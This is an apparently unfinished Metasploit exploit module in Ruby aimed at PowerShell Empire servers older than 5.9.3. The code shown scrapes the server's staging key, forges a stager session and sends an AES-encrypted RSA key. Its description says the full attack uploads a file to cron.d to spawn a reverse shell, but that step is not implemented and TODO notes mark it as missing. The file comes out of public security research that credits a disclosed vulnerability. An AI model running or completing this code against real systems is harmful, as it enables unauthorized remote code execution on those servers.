class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
  	include Msf::Exploit::FileDropper

	# TODO get hash where vunerability was fixed
	# TODO create test docker container of empire 
	# TODO payload, targets, platform
	# Break POC down into small steps, mostly concerned with foregry of stages first

	# todo info not working

	# TODO verify the staging key has been recovered with a vunerable commit. 
	def initialize(info={})
		super(
			update_info(
				info,
				'Name' => 'PowerShellEmpire Arbitrary file Upload (Millennium Falcon)',

				'Description' => %q{This module exploits a vulnerability in PowerShellEmpire < 5.9.3 
					which allows for RCE via arbitary file uploads. This module will upload a file to the cron.d 
					directory to spawn a reverse shell. Thank you to AceResponder for the discovery of 
					this vunerability and original POC; and of course thank you to h00die for the module suggestion },

					'Author' => [
						'Ace Responder', # Original exploit discovery and POC
						'gardnerapp' # Metasploit module
					], 

					'License' => MSF_LICENSE,
					'References' => [
						'https://aceresponder.com/blog/exploiting-empire-c2-framework',
						'https://github.com/ACE-Responder/Empire-C2-RCE-PoC',
						'https://bc-security.gitbook.io/empire-wiki/quickstart/staging'
					],
					'Payload'         =>
					        {
					          'DisableNops' => true,
					        },
				      'Platform'        => %w{ linux python },
				      'Targets'         =>
				        [
				          [ 'Python', { 'Arch' => ARCH_PYTHON, 'Platform' => 'python' } ],
				          [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ],
				          [ 'Linux x64', { 'Arch' => ARCH_X64, 'Platform' => 'linux' } ]
				        ],
				))

			register_options(
				[
					Opt::RPORT(80),
					OptString.new("TARGETURI", [ 
						false, 
						'Base URI path',
						 '/']),
					OptString.new("STAGE0_URI", [
						 true, 
						'Resource request by initial launcher, default is /download/python', 
						'/download/python']),
					OptString.new("STAGE1_URI", [
						 true, 
						'Endpoint for stager to communicate back to Empire. Default value is \'/admin/get.php\'. Other default values for Empire stagers are: \'/news.php\' and \'/login/process.php\'', 
						'/admin/get.php']), 
				])
	end 

	def check
    	return Exploit::CheckCode::Safe if get_staging_key.nil?

    	Exploit::CheckCode::Appears
  	end

  	def rsa_encode_int(value)
	    encoded = []
	    while value > 0 do
	      encoded << (value & 0xff)
	      value >>= 8
	    end

	    Rex::Text::encode_base64(encoded.reverse.pack('C*'))
  	end

  	def rsa_key_to_xml(rsa_key)
	    rsa_key_xml  = "<RSAKeyValue>\n"
	    rsa_key_xml << "  <Exponent>#{ rsa_encode_int(rsa_key.e.to_i) }</Exponent>\n"
	    rsa_key_xml << "  <Modulus>#{ rsa_encode_int(rsa_key.n.to_i) }</Modulus>\n"
	    rsa_key_xml << "</RSAKeyValue>"

	    rsa_key_xml
 	end

  	def aes_encrypt(key,data)
	  	cipher = OpenSSL::Cipher.new('aes-256-cbc')
	    cipher.encrypt
	    iv = cipher.random_iv
	    cipher.key = key
	    cipher.iv = iv
	    data = iv + cipher.update(data) + cipher.final

	    digest = OpenSSL::Digest.new('sha1')
	    data << OpenSSL::HMAC.digest(digest, key, data)
	    
	    data
  	end 

  	# Send Agent public key and session ID
  	def stage1(staging_key, public_key, session_id)
  		# encrypt pub key as data with staging key as aes k
  		res = send_request_cgi!({
  			'cookie' => "SESSIONID=#{session_id}",
  			'data' => aes_encrypt(staging_key, rsa_key_to_xml(public_key)),
  			'method' => 'POST',
  			'uri' => normalize_uri(target_uri.path, datastore['STAGE1_URI'])
  		})

  		fail_with(Failure::Unknown, 'Failed to send the RSA key') unless res and res.code == 200
    	print_good("Successfully sent the RSA key")

    	puts res
  	end

  	# Recovers the staging key, spoofs step0 of stager process
	# Staging URI is subject to change
	def get_staging_key
		res = send_request_cgi!({
			'method' => 'GET',
			'uri' => normalize_uri(target_uri.path, datastore['STAGE0_URI'])
		})


		return unless res && res.code == 200
		
		staging_key = res.body.match(/key=IV\+\'(.*)\'\.encode/).to_s.delete_prefix!("key=IV+'").delete_suffix!("'.encode")
		staging_key
	end 

	def exploit
		#todo get these to print
		print_status("Attempting to recover staging key....")
		# grab the staging key from the server and start spoofing as a stager
		staging_key = get_staging_key

		fail_with(Failure::Unknown, 'Failed to recover staging key.') if staging_key.nil?

		print_good("Recovered staging key -> \"#{staging_key}\" !")

		pub_key = OpenSSL::PKey::RSA.new 2048
		session_id = (0...8).map { (('A'..'Z').to_a + ('0'..'9').to_a).sample }.join.encode("UTF-8")
		#session_id = SecureRandom.alphanumeric(8).encode 'UTF-8'
		# creates seq of bytes
		# Rand uppercase ASCII + Rand digits 
		# UTF-8 encode
		# in range 8
		
		stage1(staging_key, pub_key, session_id)
	end 
end 